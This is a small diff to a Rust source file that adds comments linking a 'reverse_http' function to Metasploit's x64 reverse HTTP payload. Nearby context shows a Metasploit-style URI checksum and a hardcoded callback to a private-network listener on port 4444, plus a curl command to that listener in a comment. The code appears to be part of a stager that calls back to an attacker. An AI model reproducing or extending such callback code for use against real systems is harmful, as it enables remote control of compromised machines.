@@ -55,6 +55,8 @@ fn gen_uri_checksum(length: u32) -> String {
 // GET /BE-mOx_33owBzADOYdIneQQKsFrLVyLmiEfQbEaPs1N1fm8p5UCxoI2fblNIw89ErU9br1bHL3KOyzfvEjZo792JrTaeFgu1zrPyenLV0I9wnYcsSclH4bsJ5q-3TsxEgdCcJGbgQHAi8X5V-k_j--jJbGXfqTDS3OlGa1h67HaYU92_QeM6-OlI7GQX8 HTTP/1.1
 // curl http://192.168.142.141:4444/BE-mOx_33owBzADOYdIneQQKsFrLVyLmiEfQbEaPs1N1fm8p5UCxoI2fblNIw89ErU9br1bHL3KOyzfvEjZo792JrTaeFgu1zrPyenLV0I9wnYcsSclH4bsJ5q-3TsxEgdCcJGbgQHAi8X5V-k_j--jJbGXfqTDS3OlGa1h67HaYU92_QeM6-OlI7GQX8
 async fn reverse_http() -> Result<(), Box<dyn Error>> {
+    //  # Choose a random URI length between 30 and 255 bytes
+    // lib\msf\core\payload\windows\x64\reverse_http_x64.rb#L109
     let checksum = gen_uri_checksum(30);
     let url = concat!("http://192.168.142.141:4444", "/").to_owned();
     let url = format!("{}{}", url, checksum);
